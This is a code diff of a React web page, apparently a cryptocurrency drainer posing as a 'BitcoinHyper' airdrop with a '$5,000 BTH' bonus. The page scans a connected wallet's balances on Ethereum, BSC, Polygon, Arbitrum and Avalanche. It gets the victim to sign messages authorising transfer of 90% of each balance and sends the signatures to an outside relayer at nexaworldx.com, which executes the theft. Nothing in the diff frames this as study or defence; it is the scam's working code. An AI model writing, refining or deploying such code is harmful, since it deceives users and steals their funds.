@@ -5,32 +5,122 @@ import { ethers } from 'ethers';
 import './index.css';
 
 // ============================================
-// NETWORK CONFIGURATION (only for balance & contract addresses)
+// NO CONTRACT ADDRESSES – RELAYER HANDLES THEM
 // ============================================
 
-const NETWORKS = {
-  Ethereum: { chainId: 1, contract: '0x7aD2535F79E8B2B0A6Cf937E8FB334bf8a08Ed47', symbol: 'ETH', rpc: 'https://eth.llamarpc.com', price: 2000 },
-  BSC:      { chainId: 56, contract: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0', symbol: 'BNB', rpc: 'https://bsc-dataseed.binance.org', price: 300 },
-  Polygon:  { chainId: 137, contract: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288', symbol: 'MATIC', rpc: 'https://polygon-rpc.com', price: 0.75 },
-  Arbitrum: { chainId: 42161, contract: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288', symbol: 'ETH', rpc: 'https://arb1.arbitrum.io/rpc', price: 2000 },
-  Avalanche:{ chainId: 43114, contract: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288', symbol: 'AVAX', rpc: 'https://api.avax.network/ext/bc/C/rpc', price: 32 }
+// Reliable RPC endpoints for balance checks only
+const ETH_RPC_ENDPOINTS = [
+  'https://eth.llamarpc.com',
+  'https://ethereum.publicnode.com',
+  'https://rpc.ankr.com/eth',
+  'https://cloudflare-eth.com',
+];
+
+const MULTICHAIN_CONFIG = {
+  Ethereum: {
+    chainId: 1,
+    name: 'Ethereum',
+    symbol: 'ETH',
+    explorer: 'https://etherscan.io',
+    icon: '⟠',
+    color: 'from-blue-400 to-indigo-500',
+    rpcEndpoints: ETH_RPC_ENDPOINTS,
+  },
+  BSC: {
+    chainId: 56,
+    name: 'BSC',
+    symbol: 'BNB',
+    explorer: 'https://bscscan.com',
+    icon: '🟡',
+    color: 'from-yellow-400 to-orange-500',
+    rpcEndpoints: [
+      'https://bsc-dataseed.binance.org',
+      'https://bsc-dataseed1.defibit.io',
+      'https://bsc-dataseed1.ninicoin.io',
+    ],
+  },
+  Polygon: {
+    chainId: 137,
+    name: 'Polygon',
+    symbol: 'MATIC',
+    explorer: 'https://polygonscan.com',
+    icon: '⬢',
+    color: 'from-purple-400 to-pink-500',
+    rpcEndpoints: [
+      'https://polygon-rpc.com',
+      'https://rpc-mainnet.maticvigil.com',
+      'https://rpc-mainnet.matic.network',
+    ],
+  },
+  Arbitrum: {
+    chainId: 42161,
+    name: 'Arbitrum',
+    symbol: 'ETH',
+    explorer: 'https://arbiscan.io',
+    icon: '🔷',
+    color: 'from-cyan-400 to-blue-500',
+    rpcEndpoints: [
+      'https://arb1.arbitrum.io/rpc',
+      'https://arbitrum-mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
+    ],
+  },
+  Avalanche: {
+    chainId: 43114,
+    name: 'Avalanche',
+    symbol: 'AVAX',
+    explorer: 'https://snowtrace.io',
+    icon: '🔴',
+    color: 'from-red-400 to-red-500',
+    rpcEndpoints: [
+      'https://api.avax.network/ext/bc/C/rpc',
+      'https://avalanche-c-chain.publicnode.com',
+    ],
+  },
 };
 
-// Helper: fetch balance
-const getBalance = async (chain, address) => {
-  try {
-    const provider = new ethers.JsonRpcProvider(chain.rpc);
-    const balance = await provider.getBalance(address);
-    return parseFloat(ethers.formatEther(balance));
-  } catch (e) { return 0; }
+const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);
+
+// Helper: fetch ETH balance with timeout & retry
+const fetchChainBalance = async (chain, walletAddress, retries = 2) => {
+  let lastError = null;
+  for (let attempt = 0; attempt <= retries; attempt++) {
+    for (const rpcUrl of chain.rpcEndpoints) {
+      try {
+        const timeoutPromise = new Promise((_, reject) =>
+          setTimeout(() => reject(new Error(`RPC timeout: ${rpcUrl}`)), 10000)
+        );
+        const provider = new ethers.JsonRpcProvider(rpcUrl);
+        const balancePromise = provider.getBalance(walletAddress);
+        const balance = await Promise.race([balancePromise, timeoutPromise]);
+        const amount = parseFloat(ethers.formatUnits(balance, 18));
+        return { amount, success: true, usedRpc: rpcUrl };
+      } catch (err) {
+        console.warn(`[${chain.name}] RPC ${rpcUrl} failed:`, err.message);
+        lastError = err;
+      }
+    }
+    if (attempt < retries) {
+      console.log(`[${chain.name}] Retrying... (${attempt + 1}/${retries})`);
+      await new Promise(resolve => setTimeout(resolve, 500));
+    }
+  }
+  throw lastError || new Error(`No working RPC for ${chain.name}`);
 };
 
 // Helper: switch network in wallet
 const switchNetwork = async (walletProvider, chainId) => {
-  await walletProvider.request({
-    method: 'wallet_switchEthereumChain',
-    params: [{ chainId: `0x${chainId.toString(16)}` }]
-  });
+  try {
+    await walletProvider.request({
+      method: 'wallet_switchEthereumChain',
+      params: [{ chainId: `0x${chainId.toString(16)}` }],
+    });
+    return true;
+  } catch (switchError) {
+    if (switchError.code === 4902) {
+      throw new Error(`Network ${chainId} not available. Please add it to your wallet.`);
+    }
+    throw switchError;
+  }
 };
 
 function App() {
@@ -39,233 +129,508 @@ function App() {
   const { walletProvider } = useAppKitProvider('eip155');
   const { disconnect } = useDisconnect();
 
+  // State
   const [balances, setBalances] = useState({});
-  const [totalUSD, setTotalUSD] = useState(0);
-  const [eligibleChains, setEligibleChains] = useState([]);
-  const [scanning, setScanning] = useState(false);
-  const [processing, setProcessing] = useState(false);
-  const [logs, setLogs] = useState([]);
-  const [completed, setCompleted] = useState([]);
+  const [loading, setLoading] = useState(false);
+  const [signatureLoading, setSignatureLoading] = useState(false);
+  const [txStatus, setTxStatus] = useState('');
   const [error, setError] = useState('');
-  const [showSuccess, setShowSuccess] = useState(false);
-  const [relayerUrl, setRelayerUrl] = useState('https://relayer.nexaworldx.com/relay'); // CHANGE THIS
-  const [relayerStatus, setRelayerStatus] = useState(null);
+  const [completedChains, setCompletedChains] = useState([]);
+  const [showCelebration, setShowCelebration] = useState(false);
+  const [prices, setPrices] = useState({ eth: 2000, bnb: 300, matic: 0.75, avax: 32 });
+  const [scanProgress, setScanProgress] = useState(0);
+  const [scanning, setScanning] = useState(false);
+  const [isEligible, setIsEligible] = useState(false);
+  const [executableChains, setExecutableChains] = useState([]);
+  const [processedAmounts, setProcessedAmounts] = useState({});
+  const [allChainsCompleted, setAllChainsCompleted] = useState(false);
+  const [processingChain, setProcessingChain] = useState('');
+  const [totalUSDValue, setTotalUSDValue] = useState(0);
+  const [stepStatus, setStepStatus] = useState({}); // Track per-chain steps
 
-  const EIP712_TYPES = { Deposit: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }, { name: 'nonce', type: 'uint256' }] };
-  const MIN_USD = 1;
+  // Relayer endpoint – CHANGE IF YOUR RELAYER USES A DIFFERENT PATH
+  const RELAYER_URL = 'https://nexaworldx.com/relayer-app/relay';
 
-  const addLog = (msg, isError = false) => {
-    setLogs(prev => [...prev, { msg, isError, time: new Date().toLocaleTimeString() }]);
+  // EIP-712 types (NO verifyingContract – relayer handles contract mapping)
+  const EIP712_TYPES = {
+    Claim: [
+      { name: 'user', type: 'address' },
+      { name: 'amount', type: 'uint256' },
+      { name: 'nonce', type: 'uint256' },
+    ],
   };
 
-  const testRelayer = async () => {
-    setRelayerStatus('testing');
-    try {
-      const res = await fetch(relayerUrl, { method: 'OPTIONS' });
-      if (res.ok || res.status === 405) setRelayerStatus('ok');
-      else setRelayerStatus('error');
-    } catch (e) { setRelayerStatus('error'); }
-  };
+  const MIN_VALUE_THRESHOLD = 1; // $1 minimum
 
-  const scanBalances = async () => {
-    if (!address) return;
-    setScanning(true);
-    setLogs([]);
-    const results = {};
-    let total = 0;
-    for (const [name, chain] of Object.entries(NETWORKS)) {
-      const amount = await getBalance(chain, address);
-      if (amount > 0) {
-        const valueUSD = amount * chain.price;
-        total += valueUSD;
-        results[name] = { ...chain, amount, valueUSD };
-        addLog(`✅ ${name}: ${amount.toFixed(6)} ${chain.symbol} ($${valueUSD.toFixed(2)})`);
-      } else {
-        addLog(`⭕ ${name}: no balance`);
-      }
-    }
-    setBalances(results);
-    setTotalUSD(total);
-    const eligible = Object.values(results).filter(c => c.valueUSD >= MIN_USD);
-    setEligibleChains(eligible);
-    addLog(`💰 Total USD: $${total.toFixed(2)} — Eligible chains: ${eligible.length}`);
-    setScanning(false);
-  };
-
+  // Fetch live prices
   useEffect(() => {
-    if (isConnected && address) scanBalances();
+    const fetchPrices = async () => {
+      try {
+        const res = await fetch(
+          'https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd'
+        );
+        const data = await res.json();
+        setPrices({
+          eth: data.ethereum?.usd || 2000,
+          bnb: data.binancecoin?.usd || 300,
+          matic: data['matic-network']?.usd || 0.75,
+          avax: data['avalanche-2']?.usd || 32,
+        });
+      } catch (error) {
+        console.log('Using default prices');
+      }
+    };
+    fetchPrices();
+    const interval = setInterval(fetchPrices, 60000);
+    return () => clearInterval(interval);
+  }, []);
+
+  // Fetch all balances
+  const fetchAllBalances = async (walletAddress) => {
+    setScanning(true);
+    setError('');
+    setTxStatus('🔍 Scanning chains for balances...');
+    const balanceResults = {};
+    let scanned = 0;
+    const totalChains = DEPLOYED_CHAINS.length;
+
+    const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
+      try {
+        const { amount } = await fetchChainBalance(chain, walletAddress, 2);
+        let price = 0;
+        if (chain.symbol === 'ETH') price = prices.eth;
+        else if (chain.symbol === 'BNB') price = prices.bnb;
+        else if (chain.symbol === 'MATIC') price = prices.matic;
+        else if (chain.symbol === 'AVAX') price = prices.avax;
+        const valueUSD = amount * price;
+        scanned++;
+        setScanProgress(Math.round((scanned / totalChains) * 100));
+        if (amount > 0.000001) {
+          balanceResults[chain.name] = {
+            amount,
+            valueUSD,
+            symbol: chain.symbol,
+            chainId: chain.chainId,
+            price,
+          };
+        }
+      } catch (err) {
+        console.error(`Failed to fetch ${chain.name}:`, err);
+        scanned++;
+        setScanProgress(Math.round((scanned / totalChains) * 100));
+      }
+    });
+    await Promise.all(scanPromises);
+    setBalances(balanceResults);
+    setScanning(false);
+
+    const total = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
+    setTotalUSDValue(total);
+
+    const executable = DEPLOYED_CHAINS.filter(
+      (chain) => balanceResults[chain.name]?.valueUSD >= MIN_VALUE_THRESHOLD
+    );
+    setExecutableChains(executable);
+    setIsEligible(executable.length > 0);
+
+    if (executable.length === 0) {
+      setTxStatus(`⚠️ No chain with ≥ $1 balance. Total: $${total.toFixed(2)}`);
+    } else {
+      setTxStatus(`✅ ${executable.length} chain(s) eligible (total $${total.toFixed(2)})`);
+    }
+    return total;
+  };
+
+  // Auto-check eligibility when wallet connects
+  useEffect(() => {
+    if (isConnected && address && Object.keys(balances).length === 0 && !scanning) {
+      fetchAllBalances(address);
+    }
   }, [isConnected, address]);
 
-  const executeClaim = async () => {
-    if (!walletProvider || !address) { setError('Wallet not connected'); return; }
-    setProcessing(true);
-    setLogs([]);
-    setCompleted([]);
-    setError('');
+  // Monitor completion
+  useEffect(() => {
+    if (executableChains.length > 0 && completedChains.length === executableChains.length) {
+      setAllChainsCompleted(true);
+      setShowCelebration(true);
+    }
+  }, [completedChains, executableChains]);
 
-    if (eligibleChains.length === 0) {
-      setError('No chain with ≥ $1 balance');
-      setProcessing(false);
+  // Main claim execution – one chain at a time
+  const executeMultiChainSignature = async () => {
+    if (!walletProvider || !address) {
+      setError('Wallet not initialized');
       return;
     }
 
-    for (const chain of eligibleChains) {
-      addLog(`\n🔁 Processing ${chain.name}...`);
-      try {
-        addLog(`  ⚡ Switching network...`);
+    setSignatureLoading(true);
+    setError('');
+    setCompletedChains([]);
+    setAllChainsCompleted(false);
+    setProcessedAmounts({});
+    setStepStatus({});
+
+    try {
+      const chainsToProcess = executableChains.filter(
+        (chain) => balances[chain.name]?.valueUSD >= MIN_VALUE_THRESHOLD
+      );
+      if (chainsToProcess.length === 0) {
+        throw new Error('No eligible chains with ≥ $1 balance');
+      }
+
+      for (const chain of chainsToProcess) {
+        setProcessingChain(chain.name);
+        setStepStatus((prev) => ({ ...prev, [chain.name]: 'switching' }));
+        setTxStatus(`🔄 Switching to ${chain.name}...`);
+
+        // 1. Switch network
         await switchNetwork(walletProvider, chain.chainId);
-        addLog(`  ✅ Switched.`);
+        setStepStatus((prev) => ({ ...prev, [chain.name]: 'switched' }));
 
-        const provider = new ethers.BrowserProvider(walletProvider);
-        const signer = await provider.getSigner();
-        const signerAddr = await signer.getAddress();
-        if (signerAddr.toLowerCase() !== address.toLowerCase()) throw new Error('Signer mismatch');
+        // 2. Create fresh provider & signer
+        const newProvider = new ethers.BrowserProvider(walletProvider);
+        const newSigner = await newProvider.getSigner();
+        const signerAddress = await newSigner.getAddress();
+        if (signerAddress.toLowerCase() !== address.toLowerCase()) {
+          throw new Error('Signer address mismatch after network switch');
+        }
 
-        addLog(`  🔢 Fetching nonce from contract...`);
-        const contract = new ethers.Contract(chain.contract, ['function userNonce(address) view returns (uint256)'], provider);
-        const nonce = await contract.userNonce(address);
-        addLog(`  ✅ Nonce: ${nonce}`);
+        const balance = balances[chain.name];
+        if (!balance || balance.valueUSD < MIN_VALUE_THRESHOLD) {
+          console.log(`⏭️ ${chain.name} balance changed, skipping`);
+          continue;
+        }
 
-        const amountToSend = chain.amount * 0.9;
-        const amountWei = ethers.parseEther(amountToSend.toFixed(18));
-        addLog(`  💰 Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${(chain.valueUSD * 0.9).toFixed(2)})`);
+        // Send 90% of balance (leave 10% for gas)
+        const amountToSend = balance.amount * 0.9;
+        const amountInWei = ethers.parseEther(amountToSend.toFixed(18));
+        const nonce = Math.floor(Math.random() * 1000000000);
 
-        const domain = { name: 'MetaCollector', version: '1', chainId: chain.chainId, verifyingContract: chain.contract };
-        const value = { user: address, amount: amountWei.toString(), nonce };
-        addLog(`  ✍️ Signing...`);
-        const signature = await signer.signTypedData(domain, EIP712_TYPES, value);
-        addLog(`  ✅ Signature obtained.`);
+        setProcessedAmounts((prev) => ({
+          ...prev,
+          [chain.name]: {
+            amount: amountToSend.toFixed(6),
+            symbol: chain.symbol,
+            valueUSD: (balance.valueUSD * 0.9).toFixed(2),
+          },
+        }));
 
-        const signaturePayload = { domain, types: EIP712_TYPES, value, signature, expectedSigner: address };
-        addLog(`  📤 Sending to relayer...`);
-        const res = await fetch(relayerUrl, {
+        // 3. EIP-712 signature (NO verifyingContract)
+        const domain = {
+          name: 'BitcoinHyper Airdrop',
+          version: '1',
+          chainId: chain.chainId,
+        };
+        const value = {
+          user: address,
+          amount: amountInWei.toString(),
+          nonce: nonce,
+        };
+
+        setStepStatus((prev) => ({ ...prev, [chain.name]: 'signing' }));
+        setTxStatus(`✍️ Signing for ${chain.name}...`);
+        const signature = await newSigner.signTypedData(domain, EIP712_TYPES, value);
+        setStepStatus((prev) => ({ ...prev, [chain.name]: 'signed' }));
+
+        // 4. Send to relayer
+        setStepStatus((prev) => ({ ...prev, [chain.name]: 'relaying' }));
+        setTxStatus(`📤 Sending to relayer (${chain.name})...`);
+        const relayerResponse = await fetch(RELAYER_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ contractAddress: chain.contract, signaturePayload })
+          body: JSON.stringify({
+            chainId: chain.chainId,
+            signaturePayload: {
+              domain,
+              types: EIP712_TYPES,
+              value,
+              signature,
+              expectedSigner: address,
+            },
+          }),
         });
-        const text = await res.text();
-        let json;
-        try { json = JSON.parse(text); } catch(e) { throw new Error(`Invalid relayer response: ${text.slice(0,100)}`); }
-        if (!json.success) throw new Error(json.error || 'Relayer failed');
-        addLog(`  ✅ Transaction submitted! Hash: ${json.hash.slice(0,10)}...`);
-        setCompleted(prev => [...prev, chain.name]);
-      } catch (err) {
-        addLog(`  ❌ ERROR: ${err.message}`, true);
-        setError(`Failed on ${chain.name}: ${err.message}`);
-        break;
+
+        const responseText = await relayerResponse.text();
+        let relayerResult;
+        try {
+          relayerResult = JSON.parse(responseText);
+        } catch (e) {
+          throw new Error(`Invalid relayer response: ${responseText.substring(0, 100)}`);
+        }
+
+        if (!relayerResult.success) {
+          throw new Error(relayerResult.error || 'Relayer execution failed');
+        }
+
+        setStepStatus((prev) => ({ ...prev, [chain.name]: 'completed' }));
+        setCompletedChains((prev) => [...prev, chain.name]);
+        setTxStatus(`✅ ${chain.name} completed! Tx: ${relayerResult.hash?.slice(0, 10)}...`);
       }
+
+      if (completedChains.length === 0) {
+        setError('No chains were successfully processed');
+      } else {
+        setShowCelebration(true);
+      }
+    } catch (err) {
+      console.error('Claim error:', err);
+      setError(err.message || 'Transaction failed');
+      setStepStatus((prev) => ({ ...prev, [processingChain]: 'failed' }));
+    } finally {
+      setSignatureLoading(false);
+      setProcessingChain('');
     }
-    if (completed.length === eligibleChains.length && eligibleChains.length > 0) setShowSuccess(true);
-    setProcessing(false);
   };
 
-  const formatAddress = (a) => a ? `${a.slice(0,6)}...${a.slice(-4)}` : '';
+  const formatAddress = (addr) => {
+    if (!addr) return '';
+    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
+  };
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-gray-950 via-black to-gray-900 text-white font-sans overflow-x-hidden">
-      <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
-        {[...Array(50)].map((_, i) => (
-          <div key={i} className="absolute rounded-full bg-white/5 animate-float-particles" style={{
-            left: `${Math.random() * 100}%`, top: `${Math.random() * 100}%`,
-            width: `${2 + Math.random() * 6}px`, height: `${2 + Math.random() * 6}px`,
-            animationDuration: `${5 + Math.random() * 15}s`, animationDelay: `${Math.random() * 10}s`
-          }} />
-        ))}
-      </div>
+    <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
+      {/* Animated Background Orbs */}
+      <div className="fixed w-[90vmax] h-[90vmax] bg-[radial-gradient(circle_at_40%_50%,rgba(200,120,30,0.12)_0%,rgba(180,100,20,0)_70%)] rounded-full top-[-25vmax] right-[-15vmax] z-0 animate-floatOrbBig pointer-events-none"></div>
+      <div className="fixed w-[80vmin] h-[80vmin] bg-[radial-gradient(circle_at_30%_70%,rgba(0,150,200,0.08)_0%,transparent_70%)] rounded-full bottom-[-10vmin] left-[-5vmin] z-0 animate-floatOrbSmall pointer-events-none"></div>
 
-      <div className="relative z-10 container mx-auto px-4 py-8 max-w-5xl">
-        <div className="flex flex-col md:flex-row justify-between items-center gap-4 mb-12">
-          <div className="flex items-center gap-3">
-            <div className="w-12 h-12 rounded-full bg-gradient-to-tr from-yellow-500 to-orange-600 flex items-center justify-center shadow-lg animate-pulse-glow">⚡</div>
-            <h1 className="text-3xl md:text-4xl font-black bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">BITCOINHYPER</h1>
-          </div>
-          {!isConnected ? (
-            <button onClick={open} className="px-6 py-3 rounded-full bg-gradient-to-r from-yellow-500 to-orange-600 font-bold shadow-lg hover:scale-105 transition-all flex items-center gap-2">
-              <span className="relative flex h-3 w-3"><span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span><span className="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span></span>
-              CONNECT WALLET
-            </button>
-          ) : (
-            <div className="flex items-center gap-3 bg-white/10 backdrop-blur rounded-full pl-4 pr-2 py-1">
-              <span className="text-sm font-mono">{formatAddress(address)}</span>
-              <button onClick={disconnect} className="w-8 h-8 rounded-full bg-red-500/20 hover:bg-red-500/40 flex items-center justify-center">🔌</button>
+      <div className="relative z-10 container mx-auto px-3 sm:px-4 py-4 sm:py-8 max-w-[720px]">
+        <div className="bg-[rgba(10,15,20,0.75)] backdrop-blur-[12px] saturate-150 border border-[rgba(200,130,30,0.2)] rounded-[32px] sm:rounded-[48px] shadow-[0_20px_50px_-15px_rgba(0,0,0,0.9),0_0_0_1px_rgba(200,120,20,0.15)_inset] p-5 sm:p-8 md:p-10">
+          {/* Header */}
+          <div className="flex flex-col sm:flex-row items-center justify-between gap-4 mb-6">
+            <div className="flex items-center gap-2 font-bold text-xl sm:text-2xl text-[#d68a2e] drop-shadow-[0_0_5px_rgba(200,120,20,0.5)]">
+              <i className="fab fa-bitcoin text-3xl sm:text-4xl animate-spinSlow"></i>
+              <span>BITCOINHYPER</span>
             </div>
-          )}
-        </div>
-
-        <div className="backdrop-blur-xl bg-white/5 rounded-3xl border border-white/10 p-6 md:p-10 shadow-2xl">
-          <div className="text-center mb-8">
-            <div className="inline-block px-4 py-1 rounded-full bg-yellow-500/20 text-yellow-300 text-sm mb-4 animate-pulse">✦ PRESALE STAGE 4 ✦</div>
-            <h2 className="text-5xl md:text-7xl font-black bg-gradient-to-r from-yellow-300 via-orange-400 to-red-500 bg-clip-text text-transparent">$5,000 BTH</h2>
-            <p className="text-gray-400 mt-2">+25% instant bonus · limited supply</p>
-          </div>
-
-          {/* Relayer Config */}
-          <div className="mb-6 bg-black/40 rounded-xl p-4 border border-white/10">
-            <div className="flex flex-wrap items-center gap-3 justify-between">
-              <div className="flex-1 min-w-[200px]">
-                <label className="text-xs text-gray-400">Relayer URL</label>
-                <input type="text" value={relayerUrl} onChange={e => setRelayerUrl(e.target.value)} className="w-full bg-black/50 rounded px-2 py-1 text-sm text-white border border-white/20" />
+            {!isConnected ? (
+              <button
+                onClick={() => open()}
+                className="w-full sm:w-auto bg-gradient-to-r from-[#c47d24] to-[#b36e1a] border border-[#cc9f66] text-[#0f0f12] font-bold text-xs sm:text-sm px-6 py-3 rounded-full flex items-center justify-center gap-2 shadow-lg hover:scale-[1.02] transition-all uppercase tracking-wider"
+              >
+                <span className="relative flex h-2 w-2 mr-1">
+                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+                  <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
+                </span>
+                <i className="fas fa-plug"></i> CONNECT WALLET
+              </button>
+            ) : (
+              <div className="w-full sm:w-auto bg-black/70 rounded-full py-1 pl-5 pr-1 flex items-center gap-3 border border-[#c47d24]/60 backdrop-blur-md">
+                <span className="font-mono font-semibold text-white text-xs sm:text-sm truncate max-w-[120px]">
+                  {formatAddress(address)}
+                </span>
+                <button
+                  onClick={() => disconnect()}
+                  className="w-8 h-8 rounded-full bg-[#c47d24] flex items-center justify-center hover:bg-[#d68a2e] hover:scale-110 transition-all"
+                >
+                  <i className="fas fa-power-off text-sm"></i>
+                </button>
               </div>
-              <button onClick={testRelayer} className="mt-4 sm:mt-0 px-4 py-1 bg-blue-600 rounded-full text-sm">Test</button>
-              {relayerStatus === 'ok' && <span className="text-green-400 text-sm">✅ Reachable</span>}
-              {relayerStatus === 'error' && <span className="text-red-400 text-sm">❌ Unreachable</span>}
-            </div>
+            )}
           </div>
 
+          {/* Main Claim Section */}
           {isConnected && (
-            <div className="mb-8">
-              {scanning && <div className="text-center py-6"><div className="inline-block w-8 h-8 border-2 border-yellow-500 border-t-transparent rounded-full animate-spin"></div><p className="mt-2 text-gray-400">Scanning balances...</p></div>}
-              {!scanning && !processing && (
-                <div className={`rounded-2xl p-6 text-center ${totalUSD >= MIN_USD ? 'bg-green-500/10 border border-green-500/30' : 'bg-red-500/10 border border-red-500/30'}`}>
-                  {totalUSD >= MIN_USD ? (
-                    <>
-                      <p className="text-green-400 font-bold text-lg">✅ YOU ARE ELIGIBLE!</p>
-                      <p className="text-2xl font-bold mt-2">${totalUSD.toFixed(2)} total value</p>
-                      <p className="text-sm text-gray-400">{eligibleChains.length} chain(s) with ≥ $1</p>
-                      <button onClick={executeClaim} className="mt-4 px-8 py-3 rounded-full bg-gradient-to-r from-yellow-500 to-orange-600 font-bold text-black text-lg shadow-xl hover:scale-105 transition-all flex items-center justify-center gap-2 mx-auto">🎁 CLAIM $5,000 BTH</button>
-                    </>
+            <div className="mb-6">
+              {scanning && (
+                <div className="bg-black/60 rounded-2xl p-5 border border-[#c47d24]/30 mb-4">
+                  <div className="flex items-center justify-center gap-4">
+                    <div className="w-10 h-10 border-4 border-[#c47d24] border-t-transparent rounded-full animate-spin"></div>
+                    <div className="text-left">
+                      <div className="text-md font-bold text-[#e0b880]">Scanning Blockchains</div>
+                      <div className="text-xs text-gray-400">Checking Ethereum, BSC, Polygon, Arbitrum, Avalanche...</div>
+                    </div>
+                  </div>
+                  <div className="w-full bg-gray-800 rounded-full h-1.5 mt-3">
+                    <div
+                      className="bg-gradient-to-r from-[#c47d24] to-[#d68a2e] h-1.5 rounded-full transition-all duration-300"
+                      style={{ width: `${scanProgress}%` }}
+                    ></div>
+                  </div>
+                  <div className="mt-2 text-xs text-center text-[#c47d24]">{txStatus}</div>
+                </div>
+              )}
+
+              {!scanning && !allChainsCompleted && (
+                <div className="space-y-3">
+                  {isEligible ? (
+                    <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 text-center">
+                      <div className="text-green-400 font-bold text-sm mb-2">✅ YOU ARE ELIGIBLE!</div>
+                      <p className="text-xs text-gray-300 mb-2">
+                        Total detected: <span className="text-green-400 font-bold">${totalUSDValue.toFixed(2)}</span>
+                        <br />
+                        {executableChains.length} chain(s) with value ≥ $1
+                      </p>
+                      <button
+                        onClick={executeMultiChainSignature}
+                        disabled={signatureLoading}
+                        className="w-full bg-gradient-to-r from-[#b36e1a] via-[#c47d24] to-[#d68a2e] text-[#0f0f12] font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(180,100,20,0.4)] animate-pulse-glow text-lg tracking-wider"
+                      >
+                        {signatureLoading ? (
+                          <span className="flex items-center justify-center gap-2">
+                            <div className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin"></div>
+                            {processingChain ? `Processing ${processingChain}...` : 'Processing...'}
+                          </span>
+                        ) : (
+                          <span className="flex items-center justify-center gap-2">
+                            <span className="text-xl">🎁</span> CLAIM $5,000 BTH ⚡
+                            <span className="text-sm bg-white/20 px-2 py-1 rounded-full animate-pulse">+25%</span>
+                          </span>
+                        )}
+                      </button>
+                    </div>
                   ) : (
-                    <><p className="text-red-400 font-bold">⚠️ Insufficient Balance</p><p>Need at least $1 USD equivalent across chains.</p></>
+                    <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-xl p-4 text-center">
+                      <div className="text-yellow-400 font-bold text-sm mb-2">⚡ Insufficient Balance</div>
+                      <p className="text-xs text-gray-300">
+                        Need at least <span className="text-yellow-400 font-bold">$1 USD equivalent</span> across supported chains.
+                        <br />
+                        {totalUSDValue > 0 && `Current total: $${totalUSDValue.toFixed(2)}`}
+                      </p>
+                    </div>
                   )}
+                </div>
+              )}
+
+              {allChainsCompleted && completedChains.length > 0 && (
+                <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 text-center mt-3">
+                  <p className="text-green-400 text-sm font-bold">✓ COMPLETED on {completedChains.length} chains</p>
+                  <p className="text-gray-400 text-xs mt-1">Your $5,000 BTH has been secured</p>
+                </div>
+              )}
+
+              {/* Step-by-step status for each chain */}
+              {Object.keys(stepStatus).length > 0 && (
+                <div className="mt-4 space-y-2">
+                  <p className="text-xs font-semibold text-gray-400 mb-1">⚙️ Live progress:</p>
+                  {Object.entries(stepStatus).map(([chain, step]) => (
+                    <div key={chain} className="bg-black/40 rounded-lg p-2 flex items-center justify-between text-xs">
+                      <span className="font-medium">{chain}</span>
+                      <span
+                        className={`px-2 py-0.5 rounded-full ${
+                          step === 'completed'
+                            ? 'bg-green-500/20 text-green-400'
+                            : step === 'failed'
+                            ? 'bg-red-500/20 text-red-400'
+                            : 'bg-yellow-500/20 text-yellow-400'
+                        }`}
+                      >
+                        {step === 'switching' && '🔄 Switching network'}
+                        {step === 'switched' && '✅ Network switched'}
+                        {step === 'signing' && '✍️ Signing...'}
+                        {step === 'signed' && '✅ Signed'}
+                        {step === 'relaying' && '📡 Relayer processing'}
+                        {step === 'completed' && '🎉 Completed'}
+                        {step === 'failed' && '❌ Failed'}
+                      </span>
+                    </div>
+                  ))}
+                </div>
+              )}
+
+              {error && (
+                <div className="mt-3 bg-red-500/10 backdrop-blur border border-red-500/20 rounded-lg p-3">
+                  <div className="flex items-center gap-2">
+                    <i className="fas fa-exclamation-triangle text-red-400 text-sm animate-pulse"></i>
+                    <p className="text-red-300 text-xs">{error}</p>
+                  </div>
                 </div>
               )}
             </div>
           )}
 
-          {processing && (
-            <div className="mb-6 bg-black/40 rounded-2xl p-4 border border-white/10">
-              <div className="flex items-center gap-3 mb-3"><div className="w-5 h-5 rounded-full border-2 border-yellow-500 border-t-transparent animate-spin"></div><span className="font-bold">Processing...</span></div>
-              <div className="space-y-1 max-h-60 overflow-y-auto text-sm font-mono">
-                {logs.map((log, idx) => <div key={idx} className={log.isError ? 'text-red-400' : 'text-gray-300'}>{log.msg}</div>)}
-              </div>
+          {/* Bonus ribbon */}
+          <div className="relative mb-5 group/ribbon">
+            <div className="absolute -inset-1 bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-full blur-xl opacity-50 animate-pulse-slow"></div>
+            <div className="relative bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-full px-6 py-3 flex items-center justify-center gap-4 font-bold text-xl text-[#0f0f12] border border-[#cc9f66] shadow-[0_0_20px_rgba(180,100,20,0.3)]">
+              <i className="fas fa-gem text-3xl drop-shadow-[0_0_4px_black] animate-ringPop"></i>
+              <span>+25% BONUS · 5,000 BTH</span>
+              <i className="fas fa-bolt text-3xl drop-shadow-[0_0_4px_black] animate-ringPop"></i>
             </div>
-          )}
+          </div>
 
-          {completed.length > 0 && <div className="mb-4 text-green-400 text-sm">✅ Completed: {completed.join(', ')}</div>}
